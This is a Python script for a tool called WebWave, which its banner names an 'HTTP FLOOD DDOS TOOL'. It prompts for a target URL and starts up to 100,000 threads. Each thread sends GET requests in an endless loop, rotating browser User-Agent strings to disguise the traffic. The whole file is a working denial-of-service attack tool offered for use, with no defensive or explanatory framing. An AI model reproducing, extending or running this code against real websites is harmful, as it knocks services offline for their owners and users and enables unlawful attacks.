import requests
import threading
import random

def WebWave():
    print("""
██╗    ██╗███████╗██████╗ ██╗    ██╗ █████╗ ██╗   ██╗███████╗
██║    ██║██╔════╝██╔══██╗██║    ██║██╔══██╗██║   ██║██╔════╝
██║ █╗ ██║█████╗  ██████╔╝██║ █╗ ██║███████║██║   ██║█████╗  
██║███╗██║██╔══╝  ██╔══██╗██║███╗██║██╔══██║╚██╗ ██╔╝██╔══╝  
╚███╔███╔╝███████╗██████╔╝╚███╔███╔╝██║  ██║ ╚████╔╝ ███████╗ HTTP FLOOD 
 ╚══╝╚══╝ ╚══════╝╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝  ╚═══╝  ╚══════╝ DDOS TOOL 2024
          """)

def flood(url):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
    ]
    
    while True:
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            response = requests.get(url, headers=headers)
            print(f"[+] TARGET REQUEST ✅ {url}, : [*] SERVER 🌐 : {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

def start_flooding():
    target_url = input("[+] TARGET URL : ")
    print("[+] ATTACK START...")
    
    for i in range(100000): 
        thread = threading.Thread(target=flood, args=(target_url,))
        thread.start()

if __name__ == "__main__":
    WebWave()
    while True:
        print("[1] ATTACK WEB SERVER ")
        print("[2] Exit")
        choice = input(">> ")
        if choice == '1':
            start_flooding()
        elif choice == '2':
            print("Exiting...")
            break
        else:
            print("OPTION FAIL")
